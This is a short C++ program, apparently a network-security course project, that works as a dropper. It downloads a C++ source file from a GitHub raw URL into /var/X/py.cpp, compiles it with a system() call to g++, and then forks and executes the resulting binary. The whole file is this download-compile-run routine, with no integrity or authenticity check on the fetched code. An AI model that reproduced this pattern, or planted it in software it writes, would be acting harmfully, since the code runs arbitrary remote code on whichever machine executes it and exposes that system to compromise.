#include <cstdio>      // perror()
#include <cstdlib>     // EXIT_FAILURE
#include <curl/curl.h>
#include <unistd.h>    // fork()
#include <sys/wait.h>  // wait()

int main(int argc, char *argv[]) {
    FILE *fp;
    CURL *curl;
    CURLcode res;

    if ((fp = fopen("/var/X/py.cpp", "w")) == nullptr) {
        perror("open()");
        exit(EXIT_FAILURE);
    }

    if ((curl = curl_easy_init())) {
        curl_easy_setopt(curl, CURLOPT_URL, "https://raw.githubusercontent.com/shoulderhu/0866007-ns-proj/master/0866007_ns_proj5/py.cpp");
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);

        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform(): %s\n", curl_easy_strerror(res));
            exit(EXIT_FAILURE);
        }

    } else {
        perror("curl");
        exit(EXIT_FAILURE);
    }

    system("/usr/bin/g++ -o /var/Y/py /var/X/py.cpp");

    switch (fork()) {
        case -1:
            perror("fork()");
            exit(EXIT_FAILURE);
        case 0:  // child
            if (execl("/var/Y/py", "/var/Y/py", nullptr) == -1) {
                perror("execlp()");
                exit(EXIT_FAILURE);
            }
            break;
        default: // parent
            wait(nullptr);
            break;
    }

    return 0;
}
